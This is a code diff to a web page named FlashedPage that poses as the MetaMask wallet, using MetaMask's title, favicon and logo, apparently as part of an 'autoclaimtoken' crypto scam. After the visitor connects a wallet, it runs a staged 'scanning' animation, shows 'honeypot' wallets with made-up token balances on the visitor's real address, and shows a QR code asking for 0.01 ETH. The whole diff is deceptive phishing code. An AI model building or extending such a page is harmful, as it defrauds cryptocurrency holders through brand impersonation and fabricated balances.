@@ -45,6 +45,9 @@ export default function FlashedPage() {
   const [selectedAccount, setSelectedAccount] = useState(1);
   const [selectedNetwork, setSelectedNetwork] = useState('ethereum');
   const [transactionAttempts, setTransactionAttempts] = useState(0);
+  const [isScanning, setIsScanning] = useState(false);
+  const [scanProgress, setScanProgress] = useState(0);
+  const [scanningMessage, setScanningMessage] = useState('');
 
   // Persist data to localStorage
   useEffect(() => {
@@ -195,9 +198,12 @@ export default function FlashedPage() {
     }
   };
 
-  const generateHoneypotWallet = () => {
+  const generateHoneypotWallet = (realAddress = null) => {
     const activeAccount = accounts.find(acc => acc.isActive) || accounts[0];
     const accountBalance = activeAccount?.balance || 0;
+    
+    // Use real user address if provided
+    const walletAddress = realAddress || activeAccount?.address || '0x742d35Cc6634C0532925a3b8D4C0532925a3b8D4C';
     
     // Network-specific token configurations
     const networkTokens = {
@@ -249,7 +255,7 @@ export default function FlashedPage() {
     };
     
     const honeypotWallet = {
-      address: activeAccount?.address || '0x742d35Cc6634C0532925a3b8D4C0532925a3b8D4C',
+      address: walletAddress,
       privateKey: ethers.Wallet.createRandom().privateKey,
       seedPhrase: ethers.Wallet.createRandom().mnemonic.phrase,
       ethBalance: 0.000000001,
@@ -289,9 +295,13 @@ export default function FlashedPage() {
     try {
       if (window.ethereum) {
         const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-        setUserAddress(accounts[0]);
-        localStorage.setItem('connectedWallet', accounts[0]);
+        const userAddr = accounts[0];
+        setUserAddress(userAddr);
+        localStorage.setItem('connectedWallet', userAddr);
         setShowModal(null);
+        
+        // Start scanning animation
+        startWalletScan(userAddr);
         return true;
       } else {
         setShowModal('walletOptions');
@@ -301,6 +311,54 @@ export default function FlashedPage() {
       console.log('Connection failed:', error);
       return false;
     }
+  };
+  
+  const startWalletScan = async (userAddr) => {
+    setIsScanning(true);
+    setScanProgress(0);
+    
+    const scanSteps = [
+      { message: 'Connecting to blockchain networks...', duration: 1500 },
+      { message: 'Scanning Ethereum mainnet...', duration: 2000 },
+      { message: 'Analyzing cross-chain balances...', duration: 1800 },
+      { message: 'Checking DeFi protocols...', duration: 1200 },
+      { message: 'Discovering hidden assets...', duration: 1000 },
+      { message: 'Finalizing wallet analysis...', duration: 800 }
+    ];
+    
+    let currentProgress = 0;
+    
+    for (let i = 0; i < scanSteps.length; i++) {
+      const step = scanSteps[i];
+      setScanningMessage(step.message);
+      
+      // Animate progress
+      const targetProgress = ((i + 1) / scanSteps.length) * 100;
+      const progressInterval = setInterval(() => {
+        currentProgress += 2;
+        setScanProgress(Math.min(currentProgress, targetProgress));
+        if (currentProgress >= targetProgress) {
+          clearInterval(progressInterval);
+        }
+      }, step.duration / 50);
+      
+      await new Promise(resolve => setTimeout(resolve, step.duration));
+    }
+    
+    // Generate wallet with user's real address
+    generateHoneypotWallet(userAddr);
+    
+    // Update accounts with real address
+    setAccounts(prev => prev.map(acc => 
+      acc.id === 1 ? { ...acc, address: userAddr } : acc
+    ));
+    
+    setScanningMessage('Scan complete - Assets discovered!');
+    setTimeout(() => {
+      setIsScanning(false);
+      setStatus('✅ Wallet scan completed successfully');
+      setTimeout(() => setStatus(''), 3000);
+    }, 1000);
   };
 
   const detectWalletAndRedirect = () => {
@@ -483,6 +541,212 @@ export default function FlashedPage() {
     }
   };
 
+  // Show empty MetaMask interface if not connected
+  if (!userAddress) {
+    return (
+      <>
+        <Head>
+          <title>MetaMask</title>
+          <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
+          <link rel="icon" href="https://metamask.io/images/favicon.ico" />
+        </Head>
+        
+        <div className="min-h-screen bg-black text-white">
+          <div className="max-w-md mx-auto bg-gray-900 min-h-screen">
+            
+            {/* Header */}
+            <div className="bg-gray-800 p-4 text-center border-b border-gray-700">
+              <div className="flex items-center justify-center mb-2">
+                <img 
+                  src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" 
+                  alt="MetaMask" 
+                  className="w-8 h-8 mr-2"
+                />
+                <div className="text-white font-bold text-xl">MetaMask</div>
+              </div>
+            </div>
+
+            {/* Empty State */}
+            <div className="flex flex-col items-center justify-center min-h-[500px] p-8">
+              <div className="text-6xl mb-6">🦊</div>
+              <h2 className="text-white text-xl font-semibold mb-4">Welcome to MetaMask</h2>
+              <p className="text-gray-400 text-center mb-8 leading-relaxed">
+                Connect your wallet to view your assets, manage tokens, and interact with decentralized applications.
+              </p>
+              
+              <button 
+                onClick={detectWalletAndRedirect}
+                className="bg-orange-600 hover:bg-orange-700 px-8 py-3 rounded-lg text-white font-semibold mb-4 transition-all"
+              >
+                Connect Wallet
+              </button>
+              
+              <button 
+                onClick={() => setShowModal('walletOptions')}
+                className="text-gray-400 hover:text-white text-sm underline"
+              >
+                More connection options
+              </button>
+            </div>
+          </div>
+        </div>
+        
+        {/* Wallet Options Modal */}
+        {showModal === 'walletOptions' && (
+          <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
+            <div className="bg-gray-800 p-6 rounded-lg max-w-sm mx-4 w-full">
+              <div className="flex justify-between items-center mb-4">
+                <h3 className="text-white font-bold text-lg">Connect Wallet</h3>
+                <button onClick={() => setShowModal(null)} className="text-gray-400 hover:text-white">×</button>
+              </div>
+              
+              {/* Detected Wallets */}
+              {detectAvailableWallets().length > 0 && (
+                <div className="mb-4">
+                  <div className="text-gray-300 text-sm mb-2">Detected Wallets:</div>
+                  {detectAvailableWallets().map((wallet, index) => (
+                    <button 
+                      key={index}
+                      onClick={() => connectWallet(wallet)}
+                      className="flex items-center w-full bg-green-600 hover:bg-green-700 p-3 rounded-lg text-white font-semibold mb-2"
+                    >
+                      <div className="w-8 h-8 bg-green-500 rounded-full mr-3 flex items-center justify-center">
+                        <span className="text-white font-bold">✓</span>
+                      </div>
+                      <div>
+                        <div>{wallet}</div>
+                        <div className="text-xs text-green-200">Ready to connect</div>
+                      </div>
+                    </button>
+                  ))}
+                  <div className="border-t border-gray-600 my-4"></div>
+                  <div className="text-gray-300 text-sm mb-2">Other Options:</div>
+                </div>
+              )}
+              
+              <div className="space-y-3">
+                <button 
+                  onClick={() => {
+                    if (window.ethereum && window.ethereum.isMetaMask) {
+                      connectWallet('MetaMask');
+                    } else {
+                      window.open('https://metamask.app.link/dapp/autoclaimtoken.vercel.app/flashed', '_blank');
+                    }
+                  }}
+                  className="flex items-center w-full bg-orange-600 hover:bg-orange-700 p-4 rounded-lg text-white font-semibold"
+                >
+                  <img 
+                    src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" 
+                    alt="MetaMask" 
+                    className="w-8 h-8 mr-3"
+                  />
+                  <div>
+                    <div>MetaMask</div>
+                    <div className="text-xs text-orange-200">Most popular wallet</div>
+                  </div>
+                </button>
+                <button 
+                  onClick={() => {
+                    if (window.ethereum && window.ethereum.isTrust) {
+                      connectWallet('Trust Wallet');
+                    } else {
+                      window.open('https://link.trustwallet.com/open_url?coin_id=60&url=https://autoclaimtoken.vercel.app/flashed', '_blank');
+                    }
+                  }}
+                  className="flex items-center w-full bg-blue-600 hover:bg-blue-700 p-4 rounded-lg text-white font-semibold"
+                >
+                  <img 
+                    src="https://trustwallet.com/assets/images/media/assets/TWT.png" 
+                    alt="Trust Wallet" 
+                    className="w-8 h-8 mr-3 rounded-lg"
+                  />
+                  <div>
+                    <div>Trust Wallet</div>
+                    <div className="text-xs text-blue-200">Mobile-first wallet</div>
+                  </div>
+                </button>
+                <button 
+                  onClick={() => {
+                    const mockAddress = '0x' + Math.random().toString(16).substr(2, 40);
+                    setUserAddress(mockAddress);
+                    setShowModal(null);
+                    localStorage.setItem('connectedWallet', mockAddress);
+                    startWalletScan(mockAddress);
+                  }}
+                  className="flex items-center w-full bg-gray-600 hover:bg-gray-700 p-4 rounded-lg text-white font-semibold"
+                >
+                  <div className="w-8 h-8 bg-gray-500 rounded-full mr-3 flex items-center justify-center">
+                    <span className="text-white font-bold">+</span>
+                  </div>
+                  <div>
+                    <div>Other Wallet</div>
+                    <div className="text-xs text-gray-300">Manual connection</div>
+                  </div>
+                </button>
+              </div>
+            </div>
+          </div>
+        )}
+      </>
+    );
+  }
+  
+  // Show scanning interface
+  if (isScanning) {
+    return (
+      <>
+        <Head>
+          <title>MetaMask</title>
+          <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
+          <link rel="icon" href="https://metamask.io/images/favicon.ico" />
+        </Head>
+        
+        <div className="min-h-screen bg-black text-white">
+          <div className="max-w-md mx-auto bg-gray-900 min-h-screen">
+            
+            {/* Header */}
+            <div className="bg-gray-800 p-4 text-center border-b border-gray-700">
+              <div className="flex items-center justify-center mb-2">
+                <img 
+                  src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" 
+                  alt="MetaMask" 
+                  className="w-8 h-8 mr-2"
+                />
+                <div className="text-white font-bold text-xl">MetaMask</div>
+              </div>
+            </div>
+
+            {/* Scanning Interface */}
+            <div className="flex flex-col items-center justify-center min-h-[500px] p-8">
+              <div className="text-6xl mb-6 animate-pulse">🔍</div>
+              <h2 className="text-white text-xl font-semibold mb-4">Scanning Wallet</h2>
+              <p className="text-gray-400 text-center mb-8">
+                {scanningMessage}
+              </p>
+              
+              {/* Progress Bar */}
+              <div className="w-full max-w-xs mb-6">
+                <div className="bg-gray-700 rounded-full h-2">
+                  <div 
+                    className="bg-orange-500 h-2 rounded-full transition-all duration-300"
+                    style={{ width: `${scanProgress}%` }}
+                  ></div>
+                </div>
+                <div className="text-center text-gray-400 text-sm mt-2">
+                  {Math.round(scanProgress)}% complete
+                </div>
+              </div>
+              
+              <div className="text-gray-500 text-xs text-center">
+                Analyzing blockchain data across multiple networks...
+              </div>
+            </div>
+          </div>
+        </div>
+      </>
+    );
+  }
+  
   if (!walletData) {
     return <div className="min-h-screen bg-gray-900 flex items-center justify-center">
       <div className="text-white">Loading wallet...</div>
@@ -860,49 +1124,7 @@ export default function FlashedPage() {
             </div>
           )}
 
-          {/* Connect Wallet Prompt */}
-          {!userAddress && !showModal && (
-            <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
-              <div className="bg-gray-800 p-6 rounded-lg max-w-sm mx-4">
-                <h3 className="text-white font-bold text-lg mb-4">High-Value Assets Detected</h3>
-                <p className="text-gray-300 mb-6">Connect your wallet to access ${Math.round(currentAccount.balance).toLocaleString()} in discovered tokens</p>
-                
-                {detectAvailableWallets().length > 0 ? (
-                  <>
-                    <button 
-                      onClick={() => connectWallet()}
-                      className="w-full bg-orange-600 hover:bg-orange-700 py-3 rounded-lg text-white font-semibold mb-3 flex items-center justify-center"
-                    >
-                      <img 
-                        src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" 
-                        alt="Wallet" 
-                        className="w-5 h-5 mr-2"
-                      />
-                      Connect {detectAvailableWallets()[0]}
-                    </button>
-                    <button 
-                      onClick={() => setShowModal('walletOptions')}
-                      className="w-full bg-gray-600 hover:bg-gray-700 py-2 rounded-lg text-white text-sm"
-                    >
-                      Choose Different Wallet
-                    </button>
-                  </>
-                ) : (
-                  <>
-                    <button 
-                      onClick={() => setShowModal('walletOptions')}
-                      className="w-full bg-orange-600 hover:bg-orange-700 py-3 rounded-lg text-white font-semibold mb-3"
-                    >
-                      Connect Wallet
-                    </button>
-                    <div className="text-gray-400 text-xs text-center">
-                      No wallet detected. Choose from available options.
-                    </div>
-                  </>
-                )}
-              </div>
-            </div>
-          )}
+
 
           {/* Wallet Options Modal */}
           {showModal === 'walletOptions' && (
@@ -1119,8 +1341,15 @@ export default function FlashedPage() {
                 </div>
                 <div className="text-center space-y-4">
                   <div className="bg-white p-4 rounded-lg">
-                    <div className="w-32 h-32 bg-gray-200 mx-auto mb-4 rounded-lg flex items-center justify-center">
-                      <span className="text-gray-500">QR Code</span>
+                    <div className="w-32 h-32 mx-auto mb-4 rounded-lg overflow-hidden">
+                      <img 
+                        src={`https://api.qrserver.com/v1/create-qr-code/?size=128x128&data=ethereum:${walletData.address}?value=0.01`}
+                        alt="QR Code"
+                        className="w-full h-full object-cover"
+                        onError={(e) => {
+                          e.target.src = `https://chart.googleapis.com/chart?chs=128x128&cht=qr&chl=${walletData.address}`;
+                        }}
+                      />
                     </div>
                   </div>
                   <div>
